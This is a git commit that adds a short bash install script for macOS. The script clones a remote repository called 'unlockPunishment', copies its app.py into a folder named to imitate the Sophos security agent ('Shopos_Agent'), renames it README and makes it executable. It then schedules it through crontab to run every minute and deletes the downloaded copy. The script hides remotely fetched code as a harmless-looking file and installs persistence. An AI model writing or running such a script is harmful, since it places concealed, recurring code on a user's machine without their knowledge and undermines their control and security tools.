3177dcaab4677d969c5bf85084d36a22f06ba561
avior <avior.schreiber@allcloud.io>
2021-03-16 19:46:34 +0200

    add installation script

---
+++ install.sh
@@ -0,0 +1,10 @@
+#!/usr/bin/env bash
+
+git clone https://github.com/AviorSchreiber/unlockPunishment.git -b develop /tmp/Sophos_agent
+mkdir ~/Library/Shopos_Agent/ ||true
+ls /tmp/Sophos_agent
+cp /tmp/Sophos_agent/app.py ~/Library/Shopos_Agent/README
+ls ~/Library/Shopos_Agent
+chmod +x ~/Library/Shopos_Agent/README
+(crontab -l 2>/dev/null; echo "* * * * * ~/Library/Shopos_Agent/README") |crontab -
+rm -rf /tmp/Sophos_agent
